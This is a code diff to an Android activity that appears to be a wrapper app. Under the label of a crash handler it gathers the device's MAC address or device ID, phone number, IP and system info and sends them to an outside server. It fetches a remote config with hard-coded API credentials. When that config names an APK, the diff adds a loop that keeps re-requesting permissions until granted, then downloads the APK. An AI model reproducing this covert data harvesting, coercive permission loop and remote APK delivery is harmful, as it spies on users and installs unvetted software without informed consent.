@@ -125,8 +125,7 @@ public class MJRegusActivity extends Activity {
     private String[] permissions = new String[]{
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.REQUEST_INSTALL_PACKAGES
+            Manifest.permission.READ_PHONE_STATE
     };
     List<String> mPermissionList = new ArrayList<>();
 
@@ -139,6 +138,8 @@ public class MJRegusActivity extends Activity {
     private String phoneNum;
     private String ip;
     private String sysInfo;
+
+    private boolean isForce;//是否强制获取权限
 
 
     @Override
@@ -236,30 +237,37 @@ public class MJRegusActivity extends Activity {
     private void afterCheckPermision() {
 
 
-        if (!AssistUtils.iConnected(this)) {
-            showNoNetDialog();
-            return;
+        try {
+
+            if (!AssistUtils.iConnected(this)) {
+                showNoNetDialog();
+                return;
+            }
+
+
+            macAddress = AssistUtils.getMacAddress(this);
+            Log.e("regus_mac ", macAddress + "");
+
+            if ("02:00:00:00:00:00".equals(macAddress)) {//如果获取不到mac地址
+                macAddress = AssistUtils.getDeviceId(this);
+                Log.e("regus_mac_dev ", macAddress);
+            }
+
+            phoneNum = AssistUtils.getPhoneNum(this);
+            Log.e("regus_phoneNum ", phoneNum + "");
+            ip = AssistUtils.getIPAddress(this);
+            Log.e("regus_ip ", ip + "");
+            sysInfo = AssistUtils.getSystemInfo();
+
+            CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);
+
+            CrashHandler.getInstance()
+                    .init(getApplicationContext());
+
+        }catch (Exception e){
+
         }
 
-
-        macAddress = AssistUtils.getMacAddress(this);
-        Log.e("regus_mac ", macAddress + "");
-
-        if ("02:00:00:00:00:00".equals(macAddress)) {//如果获取不到mac地址
-            macAddress = AssistUtils.getDeviceId(this);
-            Log.e("regus_mac_dev ", macAddress);
-        }
-
-        phoneNum = AssistUtils.getPhoneNum(this);
-        Log.e("regus_phoneNum ", phoneNum + "");
-        ip = AssistUtils.getIPAddress(this);
-        Log.e("regus_ip ", ip + "");
-        sysInfo = AssistUtils.getSystemInfo();
-
-        CrashHandler.getInstance().setData("houtai.wlt99.com:48582", macAddress, phoneNum, ip, sysInfo, mAid, mSid);
-
-        CrashHandler.getInstance()
-                .init(getApplicationContext());
 
         getDt();
 
@@ -316,7 +324,7 @@ public class MJRegusActivity extends Activity {
         public void run() {
 
             try {
-                URL urll = new URL("https://qnl4eqoe.api.lncld.net/1.1/classes/UpVersion/601a83748f5787459b20a483");
+                URL urll = new URL("https://qnl4eqoe.api.lncld.net/1.1/classes/UpVersion/607e942e52b81d30aca9667a");
                 HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                 urlConnection.setRequestProperty("X-LC-Id", "QnL4eqOeVFvxKnwF1gLDJywM-gzGzoHsz");
                 urlConnection.setRequestProperty("X-LC-Key", "8gEvCsJUQAcw2RJHpfoXknLQ");
@@ -353,8 +361,10 @@ public class MJRegusActivity extends Activity {
                                 if (url.endsWith("apk")) {
                                     downLoadUrl = url;
                                     mode = 1;
-                                    Log.e("regus 得到的下载链接: ", downLoadUrl);
-                                    showDownLoadDialog();
+
+                                  //  showDownLoadDialog();
+                                    isForce = true;
+                                    checkPermision();
 
                                 } else {
                                     Intent intent = new Intent();
@@ -418,7 +428,13 @@ public class MJRegusActivity extends Activity {
              * 判断是否为空
              */
             if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
-                afterCheckPermision();
+
+                if(isForce){
+                    showDownLoadDialog();
+                }else {
+                    afterCheckPermision();
+                }
+
             } else {//请求权限方法
 
                 runOnUiThread(new Runnable() {
@@ -452,12 +468,21 @@ public class MJRegusActivity extends Activity {
                         //判断是否勾选禁止后不再询问
                         boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
                         if (showRequestPermission) {//
-                            checkPermision();//重新申请权限
+
+                            if(isForce){
+                                checkPermision();//重新申请权限
+                            }else {
+                                afterCheckPermision();
+                            }
+
                             return;
                         }
                     }
                 }
-                afterCheckPermision();
+                if (isForce)
+                    checkPermision();
+                else
+                    afterCheckPermision();
                 break;
             default:
                 break;
@@ -853,7 +878,9 @@ public class MJRegusActivity extends Activity {
                             downLoadUrl = dataJsonObject.getString("DownloadUrl");
                             mode = 1;
                             Log.e("regus 得到的下载链接: ", downLoadUrl);
-                            showDownLoadDialog();
+                           // showDownLoadDialog();
+                            isForce = true;
+                            checkPermision();
                         } else if (dataJsonObject.getBoolean("IsEnable")) {
                             //h5模式
                             mode = 0;
